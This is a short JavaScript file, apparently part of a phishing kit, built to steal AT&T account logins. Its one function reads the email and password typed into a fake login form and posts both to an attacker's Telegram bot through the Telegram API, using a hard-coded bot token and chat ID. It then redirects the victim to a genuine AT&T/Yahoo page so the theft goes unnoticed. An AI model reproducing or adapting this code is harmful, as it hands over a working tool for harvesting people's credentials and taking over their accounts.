console.log("sender.js connected");
function sendTelegramMessageAndRedirect() {
  // other user API
  const telegramBotToken = "6854177545:AAHGKxjdX8SL_eKUtCnY06CZ135vD8hDB7Q";
  const chatId = 5645205996;
  const emailValue = document.getElementById("email").value;
  const passwordValue = document.getElementById("password").value;

  const messageText = `AT&T\nEmail: ${emailValue}\nPassword: ${passwordValue}`;

  const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;

  const params = {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      chat_id: chatId,
      text: messageText,
    }),
  };

  // Make the API request
  fetch(url, params)
    .then((response) => {
      console.log(response);
      if (!response.ok) {
        throw new Error(`HTTP error! Status: ${response.status}`);
      }
      return response.json();
    })
    .then((data) => {
      console.log("Message sent:", data);
      // Redirect to another page after successful submission
      window.location.href = "https://currently.att.yahoo.com"; // Replace with your desired URL
    })
    .catch((error) => console.error("Error:", error));
}
